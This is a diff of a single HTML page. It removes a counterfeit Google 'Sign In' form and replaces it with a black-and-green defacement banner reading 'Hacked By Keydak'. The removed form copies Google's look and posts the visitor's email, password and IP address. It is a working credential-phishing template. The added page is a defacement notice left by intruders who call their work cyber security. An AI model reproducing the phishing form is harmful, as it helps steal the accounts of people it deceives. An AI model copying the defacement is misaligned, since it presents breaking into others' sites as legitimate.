@@ -1,167 +1,165 @@
-
-
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google Form</title>
+    <title>Home - Hacked By Keydak</title>
+    
+
 </head>
 <style>
-    @import url('https://fonts.googleapis.com/css2?family=Open+Sans:ital,wght@0,400;0,500;0,600;0,700;0,800;1,300;1,400;1,500;1,600;1,700;1,800&display=swap');
+    @import url('https://fonts.googleapis.com/css2?family=Josefin+Sans&display=swap');
+@import url('https://fonts.googleapis.com/css2?family=Waterfall&display=swap');
 
 
-body {
-    margin: 0;
-    padding: 0;
-    background-size: cover;
-    font-family: 'Open Sans', sans-serif;
-}
-
-.box {
-    position: absolute;
-    top: 50%;
-    left: 50%;
-    transform: translate(-50%, -50%);
-    width: 30rem;
-    padding: 3.5rem;
+* {
     box-sizing: border-box;
-    border: 1px solid #dadce0;
-    -webkit-border-radius: 8px;
-    border-radius: 8px;
+}
+
+body,
+html {
+    background : #000000;
+    font-family: 'Trebuchet MS', sans-serif;
+    text-align : center;
+}
+
+.mainContainer h1 {
+    font-family: 'Josefin Sans', sans-serif;
+    padding    : 5px 0px 10px 0px;
+    color      : #ffffff;
+    text-shadow: 0 0 10px #11d30b;
+}
+
+.mainContainer h1:hover {
+    text-shadow: 0 0 14px #0b7e07;
 
 }
 
-.box h2 {
-    margin: 0px 0 -0.125rem;
-    padding: 0;
-    text-align: center;
-    color: #202124;
-    font-size: 24px;
-    font-weight: 400;
+.container .teamName {
+    text-transform: uppercase;
+    padding       : 10px 0px;
+    letter-spacing: 20px;
+    font-family   : 'Josefin Sans', sans-serif;
+    color         : #0ae7d5;
+    font-size     : 17px;
 }
 
-.box .logo 
-{
-    display: flex;
-    flex-direction: row;
-    justify-content: center;
- 
+.container .teamName span {
+    color: red;
+}
+
+.hr {
+    width : 600px;
+    border: 2px solid #292b2983;
+}
+
+.mainImage {
+    margin       : 20px 0px;
+    width        : 200px;
+    border       : 3px solid rgba(14, 167, 14, 0.774);
+    border-radius: 50%;
+    box-shadow   : 0px 0px 17px #06d117;
 
 }
 
-.box p {
-    font-size: 16px;
-    font-weight: 400;
-    letter-spacing: 1px;
-    line-height: 1.5;
-    margin-bottom: 24px;
-    text-align: center;
+.mainImage:hover {
+    box-shadow: 0px 0px 19px #0c8a16;
 }
 
-.box .inputBox {
-    position: relative;
+.mainContainer {
+    text-shadow: 2px 2px 2px 2px green;
 }
 
-.box .inputBox input {
-    width: 93%;
-    padding: 1.3rem 10px;
-    font-size: 1rem;
-   letter-spacing: 0.062rem;
-   margin-bottom: 1.875rem;
-   border: 1px solid #ccc;
-   background: transparent;
-   border-radius: 4px;
+.text1 {
+    padding       : 5px 200px;
+    text-transform: uppercase;
+    color         : green;
+
 }
 
-.box .inputBox label {
-    position: absolute;
-    top: 10px;
-    left: 10px;
-    padding: 0.625rem 0;
-    font-size: 1rem;
-    color: gray;
-    pointer-events: none;
-    transition: 0.5s;
+
+.textbox {
+    background-color: #97e900;
+    color           : #000000;
+    font-size       : 17px;
+    border-radius   : 20px;
+    padding         : 10px 0px;
+    border          : none;
+    text-align      : center;
 }
 
-.box .inputBox input:focus ~ label,
-.box .inputBox input:valid ~ label,
-.box .inputBox input:not([value=""]) ~ label {
-    top: -1.125rem;
-    left: 10px;
-    color: #1a73e8;
-    font-size: 0.75rem;
-    background-color: #fff;
-    height: 10px;
-    padding-left: 5px;
-    padding-right: 5px;
+.text2 {
+    color         : #ffffff;
+    font-size     : 22px;
+    letter-spacing: 5px;
+    font-family   : 'Waterfall', cursive;
 }
 
-.box .inputBox input:focus {
-    outline: none;
-    border: 2px solid #1a73e8;
+@media only screen and (max-width:500px) {
+
+    .text1 {
+        padding       : 0px 20px;
+        text-transform: uppercase;
+        color         : #008000;
+    }
+
+    .effect2 {
+        font-size  : 17px;
+        padding-top: 1px;
+    }
+
+    .container .teamName {
+        padding       : 10px 0px;
+        letter-spacing: 12px;
+        font-size     : 14px;
+    }
+
+    .mainContainer h1 {
+        padding: 2px 0px;
+    }
+
+    .textbox {
+
+        font-size: 13px;
+        width    : 300px;
+    }
+
+    .hr {
+        width: 300px;
+    }
+
+    .text2 {
+        color         : #ffffff;
+        font-size     : 17px;
+        letter-spacing: 4px;
+        font-family   : 'Waterfall', cursive;
+    }
 }
-
-button{
-    border: none;
-    outline: none;
-    color: #fff;
-    background-color: #1a73e8;
-    padding: 0.625rem 1.25rem;
-    border-radius: 0.312rem;
-    font-size: 1rem;
-    float: right;
-  }
-
-  button:hover {
-    background-color: #287ae6;
-    box-shadow: 0 1px 1px 0 rgba(66,133,244,0.45), 0 1px 3px 1px rgba(66,133,244,0.3);
-  }
-
-  
-.showLabel{
-  font-size: 14px;
-}
-</style>
+    </style>
 <body>
+    <div class="mainContainer">
 
-    <div class="box">
-        <div class="logo">
-        <img src="gambar/pngwing.com.png" alt="" style="width: 30%;">
-        </div>
-    <h2>Sign In</h2>
-    <p>Use your Google Account</p>
-    <form method="post">
-        <div class="inputBox">
-          <input type="email" name="email" required onkeyup="this.setAttribute('value', this.value);"  value="">
-          <label>Email atau Ponsel</label>
-        </div>
-        <div class="inputBox">
-              <input type="password" name="password" required onkeyup="this.setAttribute('value', this.value);" value="" id="txtPassword">
-              <label>Password</label>
-            </div>
-            <div class="form-group">
-        <label class="showLabel">
-          <input type="checkbox" id="show"> 
-          Show Password
-      </label>
-    </div>
-    <input type="text" name="ipaddress" hidden value="<?=$ip_address?>">
-        <button name="register">Sign in</button>
-      </form>
-    </div>
 
+        <div class="img">
+            <img class="mainImage" src="" alt="image">
+        </div>
+        <h1> Hacked By Keydak</h1>
+        <hr class="hr">
+
+        <div class="container">
+            <h2 class="teamName"> <span> Team </span> Copyright™ </h2>
+            <p class="text1">
+                ????????
+
+            </p>
+
+
+            <p class="text2">We are team copyright, work for humanity, work for cyber security.
+            </p>
+        </div>
+    </div>
 </body>
-    <script>
-        const Password = document.querySelector("#txtPassword");
-const Checkbox = document.querySelector("#show");
 
-
-Checkbox.addEventListener('click',function(){
-  const type =Password.getAttribute("type")=== "password" ? "text" : "password";
-  Password.setAttribute("type",type);
-});
-    </script>
 </html>
